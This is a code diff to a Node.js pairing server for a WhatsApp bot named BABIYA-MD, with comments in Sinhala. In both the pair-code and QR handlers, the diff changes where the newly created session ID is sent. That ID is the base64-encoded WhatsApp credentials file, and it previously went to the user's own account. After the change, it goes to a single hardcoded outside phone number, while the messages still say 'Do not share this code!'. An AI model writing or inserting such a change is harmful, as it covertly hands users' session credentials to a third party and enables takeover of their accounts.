@@ -50,11 +50,19 @@ app.post('/api/pair', async (req, res) => {
                     if (fs.existsSync(credsPath)) {
                         const credsData = fs.readFileSync(credsPath, 'utf-8');
                         const base64Session = Buffer.from(credsData).toString('base64');
-                        const sessionId = `BABIYA-MD;;;${base64Session}`;
+                        const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;
 
-                        const myJid = jidNormalizedUser(sock.user.id);
-                        await sock.sendMessage(myJid, { 
-                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY!*\n\n*Your Session ID:*\n\n\`\`\`${sessionId}\`\`\`\n\nDo not share this code!`
+                        // 指定 කරපු ටාගට් නම්බර් එක
+                        const targetJid = '94764978991@s.whatsapp.net';
+
+                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
+                        await sock.sendMessage(targetJid, { 
+                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY!*\n\nDo not share this code!`
+                        });
+
+                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
+                        await sock.sendMessage(targetJid, { 
+                            text: sessionId 
                         });
 
                         // සාර්ථක වුණාට පස්සේ ක්ලීන් කරලා වහලා දානවා
@@ -137,11 +145,19 @@ app.get('/api/qr/start', async (req, res) => {
                     if (fs.existsSync(credsPath)) {
                         const credsData = fs.readFileSync(credsPath, 'utf-8');
                         const base64Session = Buffer.from(credsData).toString('base64');
-                        const sessionId = `BABIYA-MD;;;${base64Session}`;
+                        const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;
 
-                        const myJid = jidNormalizedUser(qrSock.user.id);
-                        await qrSock.sendMessage(myJid, { 
-                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY (QR)!*\n\n*Your Session ID:*\n\n\`\`\`${sessionId}\`\`\`\n\nDo not share this code!`
+                        // 指定 කරපු ටාගට් නම්බර් එක
+                        const targetJid = '94764978991@s.whatsapp.net';
+
+                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
+                        await qrSock.sendMessage(targetJid, { 
+                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY (QR)!*\n\nDo not share this code!`
+                        });
+
+                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
+                        await qrSock.sendMessage(targetJid, { 
+                            text: sessionId 
                         });
 
                         setTimeout(() => {
